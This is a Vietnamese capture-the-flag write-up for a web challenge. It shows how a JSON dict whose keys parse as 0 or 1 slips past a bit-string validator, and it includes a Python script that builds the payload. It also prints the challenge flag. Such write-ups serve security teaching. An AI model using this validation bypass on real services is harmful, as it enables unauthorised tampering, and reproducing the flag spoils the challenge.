Mình thấy ở `/update` duyệt sẽ check valid input như sau: duyệt `for char in data['data']` rồi ép `int(char)` ∈ {0,1}. Nếu `data['data']` là dict thì vòng lặp đi qua **key**. Nên mình sẽ tạo đúng 512 key sao cho `int(key)` luôn là 0 hoặc 1, rồi gắn một value chứa `"Holactf"`. Server lưu `str(dict)` vào file nên chuỗi `"Holactf"` xuất hiện. `/get_flag` chỉ cần `"Holactf" in data` nên trả flag.

```python
def is_valid_input(input):
    """Check if input is valid or not"""
    if input == '' or len(input) != NUMBER_OF_BITS:
        return False
    try:
        for char in input:
            if int(char) != 0 and int(char) != 1:
                return False
    except ValueError:
        return False
    return True
```

```python
@app.route('/update', methods=['POST'])
@is_User_Exist
def update():
    try:
        data = request.json
        if(not is_valid_input(data['data'])):
            return jsonify({'error':'Invalid input'})
        save_to_file(data['data'], get_user_filename())
        return jsonify({'status': 'updated', 'new_state': data['data']})
    except Exception as e:
        return jsonify({'error':e})
```

Script tạo `data`:

```python
import json

BITS = 512
HALF = BITS // 2

def zeros_block(n):
    return { '0'*(i+1): 0 for i in range(n) }

def ones_block(n):
    return { ('0'*i)+'1': 1 for i in range(n) }

def build():
    m = zeros_block(HALF)
    m.update(ones_block(HALF))
    m['0'] = 'Holactf'          # trigger
    return {"data": m}

if __name__ == "__main__":
    print(json.dumps(build()))
```

<img width="1319" height="746" alt="image" src="https://github.com/user-attachments/assets/c55ae387-1a1b-4f79-8a18-220b6de2b66d" />  

sau đó mình Intercept request để đổi `data` mình vừa gen ra:

<img width="919" height="1020" alt="image 1" src="https://github.com/user-attachments/assets/51cac076-77b2-48a8-b8af-c1284825bcb1" />  

Và access tới `/get_flag` để đọc flag:

<img width="701" height="222" alt="image 2" src="https://github.com/user-attachments/assets/37e28078-1889-4604-8003-563e740db175" />  

`FLAG: HOLACTF{a_C0NciDeNT_h4pP3n_3dd3c5938c2b}`
